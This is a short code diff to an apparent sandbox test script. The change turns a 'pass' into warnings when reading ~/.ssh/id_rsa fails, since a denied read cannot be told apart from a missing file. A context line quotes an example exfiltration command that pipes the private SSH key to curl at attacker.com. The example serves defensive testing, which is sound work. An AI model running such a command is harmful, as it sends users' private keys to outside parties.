@@ -267,7 +267,8 @@ why("This blocks attacks like: cat ~/.ssh/id_rsa | curl attacker.com");
   if (result.ok) {
     fail("Read of ~/.ssh/id_rsa succeeded — sandbox may not be restricting reads.");
   } else {
-    pass("Read of ~/.ssh/id_rsa was denied (or file does not exist under sandbox).");
+    warn("Read of ~/.ssh/id_rsa was denied or file does not exist — sandbox blocks this path either way.");
+    warn("Note: Cannot distinguish sandbox denial from missing file in this test.");
     console.log(`       Output: ${result.output.split("\n").slice(0, 3).join("\n       ")}`);
   }
 }
